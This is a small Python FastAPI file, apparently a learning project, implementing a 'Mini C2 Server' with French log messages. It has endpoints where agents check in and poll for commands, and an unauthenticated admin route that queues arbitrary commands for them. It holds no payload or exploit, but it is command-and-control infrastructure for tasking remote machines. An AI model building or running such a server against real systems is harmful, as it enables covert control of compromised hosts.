from fastapi import FastAPI
from api.schemas import (
    AgentCheckIn, 
    TaskRequest, 
    CheckInResponse, 
    TaskResponse, 
    AdminTaskResponse
)

app = FastAPI(title="Mini C2 Server")

# --- MÉMOIRE ---
registered_agents: list[AgentCheckIn] = []
pending_tasks: dict[str, list[str]] = {}

# --- ROUTES ---

# 1. Check-in
@app.post("/api/v1/checkin", response_model=CheckInResponse)
async def agent_checkin(data: AgentCheckIn) -> CheckInResponse:
    print(f"🔔 CHECK-IN: {data.hostname} ({data.agent_id})")
    
    registered_agents.append(data)
    
    if data.agent_id not in pending_tasks:
        pending_tasks[data.agent_id] = []

    return CheckInResponse(status="registered", message="Bienvenue")

# 2. Polling
@app.get("/api/v1/tasks/{agent_id}", response_model=TaskResponse)
async def get_tasks(agent_id: str) -> TaskResponse:
    
    if agent_id in pending_tasks and len(pending_tasks[agent_id]) > 0:
        task = pending_tasks[agent_id].pop(0)
        print(f"📤 ENVOI: '{task}' -> {agent_id}")
        return TaskResponse(command=task)

    return TaskResponse(command=None)

# 3. Admin
@app.post("/api/v1/admin/tasks", response_model=AdminTaskResponse)
async def add_task(task: TaskRequest) -> AdminTaskResponse:
    
    if task.agent_id not in pending_tasks:
        pending_tasks[task.agent_id] = []
    
    pending_tasks[task.agent_id].append(task.command)
    position_in_queue = len(pending_tasks[task.agent_id])
    
    print(f"✅ TÂCHE AJOUTÉE: '{task.command}'")

    return AdminTaskResponse(status="queued", position=position_in_queue)
